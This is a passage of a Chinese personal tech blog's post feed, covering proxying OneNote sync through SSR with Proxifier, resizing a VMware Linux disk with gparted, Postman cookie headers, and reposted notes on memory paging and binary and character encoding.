class="line">.docs.live.net</span><br><span class="line">! OneNote End</span><br></pre></td></tr></table></figure></li><li><p>开手机热点，然后连接手机的热点来同步。</p></li></ol><p>由于我就一学生党，第一个方法就不考虑了。后面两个方法都试了，但是均没有效果，所以又是一阵百度，最后发现了使用proxifier这款软件搭配ssr可以大幅提升onenote的同步速度。下面就来说说如何操作吧。</p><h2 id="1-proxifier配置"><a href="#1-proxifier配置" class="headerlink" title="1. proxifier配置"></a>1. proxifier配置</h2><h3 id="1-1-什么是proxifier？"><a href="#1-1-什么是proxifier？" class="headerlink" title="1.1 什么是proxifier？"></a>1.1 什么是proxifier？</h3><p>说proxifier之前，先说说我们平常使用的酸酸乳，它是一款基于socks5的代理软件，但是它不像vpn那样能够代理全局，常见的情况下，酸酸乳仅能代理浏览器。有同学说，我在酸酸乳中开了全局代理啊，咋就不是全局代理了？那我们就来验证一下，其实要验证很简单，打开你的cmd，ping一下google，ping得通，ok，那你可能的确是全局代理了。</p><p><img data-src="https://ae01.alicdn.com/kf/Hfb5fe0522ab84a64adc168354ed7a7dcv.jpg"></p><p>相信99.9%的同学都ping不通吧。这时就需要proxifier出场了。</p><blockquote><p>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQkIlQTMlRTclOTAlODYlRTYlOUMlOEQlRTUlOEElQTElRTUlOTklQTgvOTc5OTY=" title="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/97996">代理服务器<i class="fa fa-external-link"></i></span>工作的网络程序能通过HTTPS或SOCKS代理或代理链。 – 摘自《百度百科》</p></blockquote><p>也就说让原本不支持socks代理的程序，现在也能支持了。换言之，<strong>原来即使开着酸酸乳也不走代理的软件，现在也能走代理了。</strong></p><h3 id="1-1-下载proxifier"><a href="#1-1-下载proxifier" class="headerlink" title="1.1 下载proxifier"></a>1.1 下载proxifier</h3><p>proxifier原本是一款收费的软件，不够又怎能奈何国内的强大破解呢。可从下面这个链接下载：<span class="exturl" data-url="aHR0cDovL3NvZnQub25saW5lZG93bi5uZXQvc29mdC85NzE1NzkuaHRt" title="http://soft.onlinedown.net/soft/971579.htm">http://soft.onlinedown.net/soft/971579.htm<i class="fa fa-external-link"></i></span></p><p>下载以后，一路安装即可。</p><h3 id="1-2-配置"><a href="#1-2-配置" class="headerlink" title="1.2 配置"></a>1.2 配置</h3><p>打开proxifier，首先配置代理服务器：</p><p><img data-src="https://ae01.alicdn.com/kf/H7d7405b93a414ce8bb9c2080f19ea286v.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/H20ba309ae41b48a9b68e991d1e0e4516b.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/Hb4af7c1157ad495d8327b5937729b0abx.jpg"></p><p>地址填写127.0.0.1,端口填写1080，协议选socks5，最后确定即可。</p><p>接着配置代理规则：</p><p><img data-src="https://ae01.alicdn.com/kf/H13e1a3dc9c624a47afad9afd34df4860u.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/Hb37d450731fa4c21921a125789e3065cP.png"></p><p>如果要要所有应用全都走代理，就像如下配置：</p><p><img data-src="https://ae01.alicdn.com/kf/He1333e6853674779befed5d0c46844c01.jpg"></p><p>名称可以随意取，动作选择Proxy SOCKS5，确定即可。</p><p><img data-src="https://ae01.alicdn.com/kf/H843c8f44d1bb4186b97177369df46236u.png"></p><p>现在再打开cmd，来ping一下？</p><p><img data-src="https://ae01.alicdn.com/kf/H865124e87b494acebeeb4a3889717645S.jpg"></p><p>可以看到我们已经ping通google了。</p><p>当然了，不是所有应用都需要走代理的，我们当然也可以只针对某个应用来单独设置，这里就针对onenote来设置，也就是本文的最初目的，加快onenote的同步：</p><p>回到增添规则的菜单：</p><p><img data-src="https://ae01.alicdn.com/kf/Hf5091a5de48e4b44b2d1a6b132108f09g.jpg"></p><p>我这里通过浏览，增添了onenote和onedrive，确定，回到上一级，关掉all的规则，打开onenote规则，如图：</p><p><img data-src="https://ae01.alicdn.com/kf/Hebab826439a145ca92f0cee5dfecb34a2.jpg"></p><p>现在打开onenote，随便写点什么让它同步，或者加点图片，这样才能看得出效果，如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H7fda71fbe1ea439cb3d3845ae3ab8e44k.jpg"></p><p>当你在onenote中同步时，proxifier就会打印相应的log，这里可以看到onenote的确走了酸酸乳的代理。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzE0Mjc2OTMvYmxvZy83MzkxMDg=" title="https://my.oschina.net/u/1427693/blog/739108">Windows使用shadowsocks和Proxifier实现为电脑上任何一个程序代理 <i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL21heWJlaXdpbGwubWUvcHJveGlmaWVyLw==" title="http://maybeiwill.me/proxifier/">Windows 软件推荐：Proxifier（大幅度提高 OneDrive、OneNote 这类软件的同步速度）<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
            <tag> proxifier </tag>
            
            <tag> onenote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录-vmware下linux扩容</title>
      <link href="/archives/77b60c50.html"/>
      <url>/archives/77b60c50.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-背景"><a href="#0-背景" class="headerlink" title="0. 背景"></a>0. 背景</h2><p>昨天在给虚拟机安装内核编译环境的时候出现了空间不足的问题。情况大体是这样子的，我的虚拟机大约有30G的空间，在编译内核之前剩余17个G左右，我把内核源码下载下来，好不容易花了半个小时候编译好，结果在安装了一半的时候直接报错，说我no more space left。一查，发现编译产生的各种文件（驱动模块，中间文件等等）占用了16个G。excuse me？ 什么时候变这么大了。<strong>所以才对虚拟机进行了扩容，这里对整个扩容过程作一个记录。</strong></p><a id="more"></a><h2 id="1-vmware设置"><a href="#1-vmware设置" class="headerlink" title="1.  vmware设置"></a>1.  vmware设置</h2><p>打开vmware，进入要进行扩容的系统的设置界面，然后选择如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/He97275a69daa40998b90f86b6846554ea.jpg"></p><p>注意要进行扩容需要删除所有快照，并且关机。</p><p>选择你要扩充的大小，如这里扩充到80G。</p><p><img data-src="https://ae01.alicdn.com/kf/Hafe43d2859b64b59aaeff5e1a74f2bd1c.jpg"></p><p>光是这样做是不够的，我们还需要进入系统中进行相关的设置。</p><h2 id="2-Gparted分区设置"><a href="#2-Gparted分区设置" class="headerlink" title="2. Gparted分区设置"></a>2. Gparted分区设置</h2><p>进入到系统后，我们需要通过以下代码来安装gparted：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gparted</span><br></pre></td></tr></table></figure><p>现在，打开gparted，你将看到类似下图的界面：</p><p><img data-src="https://ae01.alicdn.com/kf/H4140df2400b34371afb873bc8e1bf788J.jpg"></p><p>这里大体分为了3个部分，sda1是系统的主分区，我们的根目录就挂载到这里，中间的扩展分区，扩展分区下又分出了一个swap逻辑分区，最右边的则是我们通过扩容而多出来的未分配的区域了。</p><p>现在我们要做的就是将这些未分配的空间分到咱们的主分区sda1中。不过在此之前我们需要删除扩展分区，具体执行步骤如下:</p><ol><li>选中sda5，linux_swap分区，右键，将它swap_off掉</li><li>删除sda5</li><li>删除sda2</li></ol><p>现在，应该只剩下一个主分区sda1，和一个unallocated的分区。选中sda1，右键resize，调整到你想要的大小，但是要剩余一点空间来做swap分区，个人建议剩余1G即可。最后在剩余的这1G空间里，再做如下操作：</p><ol><li>右键，new一个扩展分区（extend），空间默认为全部（即剩余的1G）</li><li>选中刚才新建的扩展分区，new一个逻辑分区，类型选择linux_swap即可。</li></ol><p>到这一步，你已经完成了vmware 下的linux扩容。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RpbXNsZXkvYXJ0aWNsZS9kZXRhaWxzLzUwNzQyNzU1" title="https://blog.csdn.net/Timsley/article/details/50742755">VMware下对Ubuntu进行扩充磁盘大小<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扩容 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录-POSTMAN中发送带Cookie的请求</title>
      <link href="/archives/41155787.html"/>
      <url>/archives/41155787.html</url>
      
        <content type="html"><![CDATA[<p>postman是个很出名的接口调试助手，虽然他已经出了独立的应用，但是我依然坚持在使用chrome插件版本。下面说下怎么在postman中调试带cookie的请求。</p><p><img data-src="https://ae01.alicdn.com/kf/H8a407e9405014962862e42a32298927b1.jpg"></p><a id="more"></a><p>chrome出于安全考虑，使得postman不能直接调试带cookie的请求，于是我们需要多安装一个插件，叫postman-interceptor：</p><p><img data-src="https://ae01.alicdn.com/kf/Hedf0972cae804f5eb52255ac8c25894cD.jpg"></p><p>安装并打开后，输入你要调试的url，在Headers栏下填写你的Cookie信息：</p><p><img data-src="https://ae01.alicdn.com/kf/H719d4790a49344ffa128ada8be9742aaI.jpg"></p><p><strong>postman中的cookie有两种填写方式：</strong></p><ol><li><p>将所有cookie的键值对都写在一栏上：key填写cookie，value填写真正的cookie键值对，格式为cookie_key1=cookie_value1; cookie_key2=cookie_value2多个cookie对用分号隔开。</p></li><li><p>一栏写一个键值对，每栏左侧key都填写cooike，右侧value依然填写真正的cookie键值对(cookie_key=cookie_value)，如:</p><p><img data-src="https://ae01.alicdn.com/kf/Ha5d4125075e1450aa4e12c5d89a14a0cR.jpg"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POSTMAN </tag>
            
            <tag> Cooklie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-计算机组成原理-程序的装载</title>
      <link href="/archives/9374b389.html"/>
      <url>/archives/9374b389.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>非科班出身，特此来补计算机基础知识。</p><p>本文为转载文章，原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudG91dGlhby5jb20vaTY3MjYxNDAwMDE3NzM0MjEwNjcv" title="https://www.toutiao.com/i6726140001773421067/">https://www.toutiao.com/i6726140001773421067/<i class="fa fa-external-link"></i></span></p><p><strong>本文导言：</strong></p><blockquote><p>比尔·盖茨在上世纪80年代说的“640K ought to be enough for anyone”</p></blockquote><p>也就是“640K内存对哪个人来说都够用了”</p><p>那个年代，微软开发的还是DOS操作系统，程序员们还在绞尽脑汁，想要用好这极为有限的640K内存</p><p>而现在，我手头的Mac Book Pro已经是16G内存了，上升了一万倍还不止。</p><p>那比尔·盖茨这句话在当时也是完全的无稽之谈么？有没有哪怕一点点的道理呢？这一讲里，我就和你一起来看一看。</p><a id="more"></a><h2 id="1-程序装载的挑战"><a href="#1-程序装载的挑战" class="headerlink" title="1 程序装载的挑战"></a>1 程序装载的挑战</h2><p>在运行这些可执行文件的时候，我们其实是通过一个装载器，解析ELF（linux下的可执行文件格式）或者PE（Windows下的可执行文件格式）的可执行文件。</p><p>装载器会把对应的指令和数据加载到内存里面来，让CPU去执行。</p><p>装载到内存**,装载器需要满足两个要求：**</p><ol><li>可执行程序加载后<strong>占用的内存空间应该是连续的</strong>：  执行指令的时候，程序计数器是顺序地一条一条指令执行。这意味着，这一条条指令需要连续地存储在一起。</li><li>需要同时加载很多个程序，并且<strong>不能让程序自己规定在内存中加载的位置</strong>：虽然编译出来的指令里已经有了对应的各种各样的内存地址，但是实际加载的时候，我们其实没有办法确保，这个程序一定加载在哪一段内存地址上。因为现在的计算机通常会同时运行很多个程序，可能你想要的内存地址已经被其他加载了的程序占用</li></ol><p>要满足这两个基本的要求，我们很容易想到一个办法。那就是我们可以在内存里面，找到一段连续的内存空间，然后分配给装载的程序，然后把这段连续的内存空间地址，和整个程序指令里指定的内存地址做一个映射。</p><ol><li><p>指令里用到的内存地址叫作<strong>虚拟内存地址（Virtual Memory Address）</strong></p></li><li><p>实际在内存硬件里面的空间地址，我们叫<strong>物理内存地址（Physical Memory Address）</strong></p></li></ol><p>程序里有指令和各种内存地址，我们只需要关心虚拟内存地址就行了。</p><p>对于任何一个程序来说，它看到的都是同样的内存地址。我们维护一个虚拟内存到物理内存的映射表，这样实际程序指令执行的时候，会通过虚拟内存地址，找到对应的物理内存地址，然后执行。因为是连续的内存地址空间，所以我们只需要<strong>维护映射关系的起始地址和对应的空间大小</strong>就可以了。</p><h2 id="2-内存分段"><a href="#2-内存分段" class="headerlink" title="2 内存分段"></a>2 内存分段</h2><p>这种找出一段连续的物理内存和虚拟内存地址进行映射的方法，我们叫<strong>分段（Segmentation）</strong>。</p><p>这里的段，就是指系统分配出来的那个连续的内存空间。</p><p><img data-src="https://ae01.alicdn.com/kf/H1544bb9c9a1e458ebee9e7413e62ef013.jpg"></p><p>分段的办法很好，解决了程序本身不需要关心具体的物理内存地址的问题，但它也有一些不足之处，第一个就是<strong>内存碎片（Memory Fragmentation）</strong>。</p><p><strong>举个例子</strong></p><p>电脑有1GB的内存<br>先启动一个图形渲染程序，占用了512MB的内存<br>接着启动一个Chrome浏览器，占用了128MB内存<br>再启动一个PY程序，占用了256MB内存<br>这个时候，我们关掉Chrome，于是空闲内存还有1024 - 512 - 256 = 256MB<br>按理来说，我们有足够的空间再去装载一个200MB的程序。但是，这256MB的内存空间不是连续的，而是被分成了两段128MB的内存</p><p>因此，实际情况是，我们的程序<strong>没办法加载进来</strong>。</p><p><img data-src="https://ae01.alicdn.com/kf/He9124d47ce1941ed9b4d124ea4a24fe8R.jpg"></p><p>当然了,有办法解决 --- <strong>内存交换（Memory Swapping）</strong></p><p>我们可以把Python程序占用的256MB内存写到硬盘，再从硬盘上读回来到内存里面</p><p>不过读回来的时候，我们不再把它加载到原来的位置，而是紧紧跟在那已经被占用了的512MB内存后面</p><p>这样，我们就有了连续的256MB内存空间，就可以去加载一个新的200MB的程序。<em>如果你自己安装过Linux操作系统，你应该遇到过分配一个swap硬盘分区的问题</em></p><p>这块分出来的磁盘空间，其实就是专门给Linux操作系统进行<strong>内存交换</strong>用的。</p><p><strong>虚拟内存、分段，再加上内存交换</strong></p><p>看起来似乎已经解决了计算机同时装载运行很多个程序的问题</p><p>不过三者的组合仍然会遇到一个性能瓶颈</p><ul><li>硬盘的访问速度要比内存慢很多</li><li>而每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上</li></ul><p>所以，如果内存交换的时候，交换的是一个很占内存空间的程序，这样整个机器都会显得卡顿。</p><h2 id="3-内存分页"><a href="#3-内存分页" class="headerlink" title="3 内存分页"></a>3 内存分页</h2><p>既然问题<em>出在内存碎片和内存交换的空间太大</em></p><p>上，那么解决问题的办法就是：</p><ol><li><p>少出现一些内存碎片。</p></li><li><p>当需要进行内存交换的时候，让需要交换写入或者从磁盘装载的数据更少一点。</p></li></ol><p>这个办法，在现在计算机的内存管理里面，就叫作<strong>内存分页（Paging）</strong></p><p>和分段这样分配一整段连续的空间给到程序相比，分页则是把整个物理内存空间切成一段段固定尺寸的大小</p><p>而对应的程序所需要占用的虚拟内存空间，也会同样切成一段段固定尺寸的大小。</p><p>这样一个连续并且尺寸固定的内存空间，我们叫<strong>页（Page）</strong>。</p><p>从虚拟内存到物理内存的映射，不再是拿整段连续的内存的物理地址，而是按照一个个页来的。</p><p>页的尺寸一般远远小于整个程序的大小。</p><p><strong>在Linux下，我们通常只设置成4KB</strong>。你可以通过命令看看你手头的Linux系统设置的页的大小。</p><p><img data-src="https://ae01.alicdn.com/kf/H3e6966db80ea4bb6b5c04df88765da84h.jpg"></p><p>有了内存分页的技术，就可以对应上面两个问题：</p><ol><li><p>由于内存空间都是预先划分好的，也就没有不能使用的碎片，而只有被释放出来的很多4KB的页。</p></li><li><p>即使内存空间不够，需要让现有的、正在运行的其他程序，通过内存交换释放出一些内存的页出来，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，让整个机器被内存交换的过程给卡住。</p></li></ol><p><img data-src="https://ae01.alicdn.com/kf/H78221bd1dab9433f9d7e0ffadaa0c9dcP.jpg"></p><p>分页的方式使得加载程序的时候，<strong>不再需要一次性把程序加载到物理内存中</strong>，可以在进行虚拟内存和物理内存的页之间的映射后，并不真的把页加载到物理内存里，而是只在程序运行中<strong>，需要用到对应虚拟内存页里面的指令和数据时，再加载到物理内存里面去。</strong></p><p>实际上，我们的操作系统，的确是这么做的：</p><p>当要读取特定的页，却发现数据并没有加载到物理内存里的时候，就会触发一个来自于CPU的<strong>缺页错误（Page Fault）</strong>，操作系统会捕捉到这个错误，然后将对应的页，从存放在硬盘上的虚拟内存里读取出来，加载到物理内存里。这种方式，<strong>使得我们可以运行那些远大于我们实际物理内存的程序</strong>。同时，这样一来，任何程序都不需要一次性加载完所有指令和数据，只需要加载当前需要用到就行了。</p><p>通过<strong>虚拟内存、内存交换和内存分页</strong>这三个技术的组合，我们最终得到了一个让程序不需要考虑实际的物理内存地址、大小和当前分配空间的解决方案。</p><p>这些技术和方法，对于我们程序的编写、编译和链接过程都是透明的。这也是我们在计算机的软硬件开发中常用的一种方法，就是<strong>加入一个间接层</strong>。</p><p>通过引入虚拟内存、页映射和内存交换，我们的程序本身，就不再需要考虑对应的真实的内存地址、程序加载、内存管理等问题了。任何一个程序，都只需要把内存当成是一块完整而连续的空间来直接使用。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>电脑只要640K内存就够了吗？很显然，现在来看，比尔·盖茨的这个判断是不合理的，那为什么他会这么认为呢？因为他也是一个很优秀的程序员啊！</p><p>在虚拟内存、内存交换和内存分页这三者结合之下，你会发现，其实要运行一个程序，“必需”的内存是很少的。CPU只需要执行当前的指令，极限情况下，内存也只需要加载一页就好了。再大的程序，也可以分成一页。每次，只在需要用到对应的数据和指令的时候，从硬盘上交换到内存里面来就好了。以我们现在4K内存一页的大小，640K内存也能放下足足160页呢，也无怪乎在比尔·盖茨会说出“640K ought to be enough for anyone”这样的话。</p><p>不过呢，硬盘的访问速度比内存慢很多，所以我们现在的计算机，没有个几G的内存都不好意思和人打招呼。</p><p>那么，除了程序分页装载这种方式之外，我们还有其他优化内存使用的方式么？下一讲，我们就一起来看看“动态装载”，学习一下让两个不同的应用程序，共用一个共享程序库的办法。</p><h2 id="5-推荐阅读"><a href="#5-推荐阅读" class="headerlink" title="5 推荐阅读"></a>5 推荐阅读</h2><p>想要更深入地了解代码装载的详细过程，推荐你阅读《程序员的自我修养——链接、装载和库》的第1章和第6章。</p><h2 id="6-思考"><a href="#6-思考" class="headerlink" title="6 思考"></a>6 思考</h2><p>在Java这样使用虚拟机的编程语言里面，我们写的程序是怎么装载到内存里面来的呢？它也和我们讲的一样，是通过内存分页和内存交换的方式加载到内存里面来的么？</p><p>jvm已经是上层应用，无需考虑物理分页，一般更直接是考虑对象本身的空间大小，物理硬件管理统一由承载jvm的操纵系统去解决吧</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>深入浅出计算机组成原理</p>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-计算机组成原理-从二进制谈字符编码</title>
      <link href="/archives/e1fc9c68.html"/>
      <url>/archives/e1fc9c68.html</url>
      
        <content type="html"><![CDATA[<p>本文中，你将学习到：</p><ul><li>什么是二进制及其相关计算</li><li>什么是补码，它的出现带来了什么优点。</li><li>如何用二进制来进行字符编码？</li><li>编程中常出现的“烫烫烫”是什么原因？</li></ul><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>非科班出身，特此来补计算机基础知识。</p><p>本文为转载文章，原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudG91dGlhby5jb20vaTY3MjY0NDU4NDMzMzY5MjE2MDQv" title="https://www.toutiao.com/i6726445843336921604/">https://www.toutiao.com/i6726445843336921604/<i class="fa fa-external-link"></i></span></p><a id="more"></a><p><strong>本文导言：</strong></p><blockquote><p>程序 = 算法 + 数据结构</p></blockquote><p>对应到计算机的组成原理(硬件层面)</p><ul><li>算法 --- 各种计算机指令</li><li>数据结构 --- 二进制数据</li></ul><p>计算机用0/1组成的二进制，来表示所有信息</p><ul><li>程序指令用到的机器码，是使用二进制表示的</li><li>存储在内存里面的字符串、整数、浮点数也都是用二进制表示的</li></ul><p><strong>万物在计算机里都是0和1，搞清楚各种数据在二进制层面是怎么表示的，是我们的必修课。</strong></p><p>在实际应用中最常遇到的问题，也就是文本字符串是怎么表示成二进制的，特别是我们会遇到的乱码究竟是怎么回事儿，在开发的时候，所说的Unicode和UTF-8之间有什么关系。</p><p>理解了这些，相信以后遇到任何乱码问题，你都能手到擒来了。</p><h2 id="1-理解二进制的“逢二进一”"><a href="#1-理解二进制的“逢二进一”" class="headerlink" title="1 理解二进制的“逢二进一”"></a>1 理解二进制的“逢二进一”</h2><p>二进制和我们平时用的十进制，并没有本质区别，只是平时是“逢十进一”，这里变成了“逢二进一”</p><p>每一位，相比于十进制下的0～9这十个数字，我们只能用0和1这两个数字。</p><h3 id="1-1-二进制的计算"><a href="#1-1-二进制的计算" class="headerlink" title="1.1 二进制的计算"></a>1.1 二进制的计算</h3><ol><li>二进制转十进制</li></ol><p>任何一个十进制的整数，都能通过二进制表示出来，把一个二进制数，对应到十进制，非常简单，就是把从右到左的第N位，乘上一个2的N次方，然后加起来，就变成了一个十进制数</p><p>当然，既然二进制是一个面向程序员的“语言”，这个从右到左的位置，自然是从0开始的。</p><p>比如0011这个二进制数，对应的十进制表示，就是<br>$$<br>0011_{(2)}=0×2^3+0×2^2+1×2^1+1×2^0=3_{(10)}<br>$$</p><p>代表十进制的3</p><ol start="2"><li>十进制转二进制</li></ol><p>对应地，如果我们想要把一个十进制的数，转化成二进制，使用<strong>短除法</strong>就可以了</p><p>也就是，把十进制数除以2的余数，作为最右边的一位。然后用商继续除以2，把对应的余数紧靠着刚才余数的右侧，这样递归迭代，直到商为0，最后将余数从底读到顶就可以了。</p><p>比如，我们想把13这个十进制数，用短除法转化成二进制，需要经历以下几个步骤：</p><p><img data-src="https://ae01.alicdn.com/kf/H804f0c2156644329a327a9fb0e3ca050n.jpg"></p><p>​                                                                                                                                                                                                     因此，对应的二进制数，就是1101。</p><h3 id="1-2-区分正负数–原码"><a href="#1-2-区分正负数–原码" class="headerlink" title="1.2 区分正负数–原码"></a>1.2 区分正负数–原码</h3><p>刚才我们举的例子都是正数，对于负数来说，情况也是一样的吗？</p><p>我们可以把一个数最左侧的一位，当成是对应的正负号，比如0为正数，1为负数，这样来进行标记。</p><p>这样，一个4位的二进制数， 0011就表示为+3。而1011最左侧的第一位是1，所以它就表示-3。*这个其实就是整数的<strong>原码表示法</strong>。</p><h3 id="1-3-补码"><a href="#1-3-补码" class="headerlink" title="1.3 补码"></a>1.3 补码</h3><p>原码表示法有一个很直观的缺点就是，0可以用两个不同的编码来表示，1000代表0， 0000也代表0。习惯万事一一对应的程序员看到这种情况，必然会被“逼死”。</p><p>于是，我们就有了另一种表示方法。我们仍然通过最左侧第一位的0和1，来判断这个数的正负。</p><p>但是，我们不再把这一位当成单独的符号位，在剩下几位计算出的十进制前加上正负号，而是在计算整个二进制值的时候，<strong>在左侧最高位前面加个负号</strong>，其余位数仍为加。</p><p>比如，一个4位的二进制补码数值1011，转换成十进制，就是<br>$$<br>-1×2^3+0×2^2+1×2^1+1×2^0=-5<br>$$<br><strong>如果最高位是1，这个数必然是负数；最高位是0，必然是正数。</strong>并且，只有0000表示0，1000在这样的情况下表示-8。一个4位的二进制数，可以表示从-8到7这16个整数，不会白白浪费一位。</p><p><strong>当然更重要的一点是，用补码来表示负数，使得我们的整数相加变得很容易，不需要做任何特殊处理，只是把它当成普通的二进制相加，就能得到正确的结果。</strong></p><p>我们简单一点，拿一个4位的整数来算一下，比如-5 + 6 = 1</p><p>我们各自把它们转换成二进制来看一看。如果它们和无符号的二进制整数的加法用的是同样的计算方式，这也就意味着它们是同样的电路。</p><p><img data-src="https://ae01.alicdn.com/kf/H5e8ebedcbdf24482a1bf6cb6a7be04a9L.jpg"></p><p>补码的计算方式：</p><ol><li><p>十进制转二进制</p><ul><li>如果是正数，那么按照常规的来就可以了。</li><li>如果是负数，则按以下规则：<ul><li>先求与该负数相对应的正整数的二进制代码</li><li>将上述二进制代码取反再加1</li><li>不够位数时，左边补1.</li></ul></li></ul><p>举个例子：</p><p>例如：（-3）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正整数为：011</span><br><span class="line">取反：100</span><br><span class="line">末尾加一：101</span><br><span class="line">如果要求数字占32位，那么就要在左边补29个1。即</span><br><span class="line">FFFF FFFD</span><br></pre></td></tr></table></figure></li><li><p>二进制转十进制</p><ol><li><p>如果最左边为0，那么按照常规的来就可以了。</p></li><li><p>如果最左边是1，则有两种方式：</p><ol><li><p>按照常规方式展开，然后最左边添加一个负号来计算。如1101:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1101 &#x3D; 2^3+2^2+2^0</span><br><span class="line">然后再最左边添加&quot;-&quot;:</span><br><span class="line">-2^+2^2+2^0&#x3D;-8+4+1&#x3D;-3</span><br></pre></td></tr></table></figure></li><li><p>或者按照以下规则：</p><ul><li>取当前二进制的反，</li><li>对上述结果+1</li><li>计算出对应的十进制值，然后添加一个负号。</li></ul><p>如1101：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1101</span><br><span class="line">取反:0010</span><br><span class="line">加1:0011</span><br><span class="line">计算十进制：3</span><br><span class="line">添加负号：-3</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h3 id="1-4-补码有什么用？"><a href="#1-4-补码有什么用？" class="headerlink" title="1.4 补码有什么用？"></a>1.4 补码有什么用？</h3><p>首先如1.3和1.4节所说的那样，补码的出现解决了原码中0有两种方式来表达的缺陷，当然最重要的是它将正负的加法都进行了统一，方便底层电路的实现。除了这些优点，它还与我们的编程息息相关，如：</p><ol><li>对于4字节的int数据类型，它的数值范围是多少？      $ -2^{31} \sim 2^{31}-1 $</li><li>最大整数的二进制代码是多少？                 $0x7FFF FFFF$</li><li>最小整数的二进制代码是多少？                  $0x8000 0000$</li><li>在编程中，数字超过最大整数会变成多少？$0x7FFF FFFF +1 = 0x8000 0000$ 从最大变成了最小。</li></ol><h2 id="2-字符串的表示，从编码到数字"><a href="#2-字符串的表示，从编码到数字" class="headerlink" title="2 字符串的表示，从编码到数字"></a>2 字符串的表示，从编码到数字</h2><p>不仅数值可以用二进制表示，字符乃至更多的信息都能用二进制表示,最典型的例子就是<strong>字符串（Character String）</strong>。</p><h3 id="2-1-ACSII码"><a href="#2-1-ACSII码" class="headerlink" title="2.1 ACSII码"></a>2.1 ACSII码</h3><p>最早计算机只需要使用英文字符，加上数字和一些特殊符号，然后用8位的二进制，就能表示我们日常需要的所有字符了，这个就是我们常常说的<strong>ASCII码（American Standard Code for Information Interchange，美国信息交换标准代码）</strong></p><p><img data-src="http://p1.pstatp.com/large/pgc-image/fb2599d066404642bc5544074a72e561" alt="重学计算机组成原理（十）- &quot;烫烫烫&quot;乱码的由来"></p><p>ASCII码就好比一个字典，用8位二进制中的128个不同的数，映射到128个不同的字符里</p><blockquote><p>比如，小写字母a在ASCII里面，就是第97个，也就是二进制的0110 0001，对应的十六进制表示就是 61。而大写字母 A，就是第65个，也就是二进制的0100 0001，对应的十六进制表示就是41。</p></blockquote><p>在ASCII码里面，字符 9不再像整数表示法里一样，用0000 1001来表示，而是用0011 1001 来表示。字符串15也不是用0000 1111 这8位来表示，而是变成两个字符1和5连续放在一起，也就是 0011 0001 和 0011 0101，需要用两个8位来表示。</p><p>我们可以看到，最大的32位整数，就是2147483647。如果用整数表示法，只需要32位就能表示了。但是如果用字符串来表示，一共有10个字符，每个字符用8位的话，需要整整80位。比起整数表示法，要多占很多空间。</p><p>i&gt; 这也是为什么，很多时候我们在存储数据的时候，要采用二进制序列化这样的方式，而不是简单地把数据通过CSV或者JSON，这样的文本格式存储来进行序列化。不管是整数也好，浮点数也好，采用二进制序列化会比存储文本省下不少空间。</p><p>ASCII码只表示了128个字符，一开始倒也堪用，毕竟计算机是在美国发明的</p><h3 id="2-2-字符集"><a href="#2-2-字符集" class="headerlink" title="2.2 字符集"></a>2.2 字符集</h3><p>然而随着越来越多的不同国家的人都用上了计算机，想要表示譬如中文这样的文字，128个字符显然是不太够用的。于是，计算机工程师们开始各显神通，给自己国家的语言创建了对应的字符集（Charset）和字符编码（Character 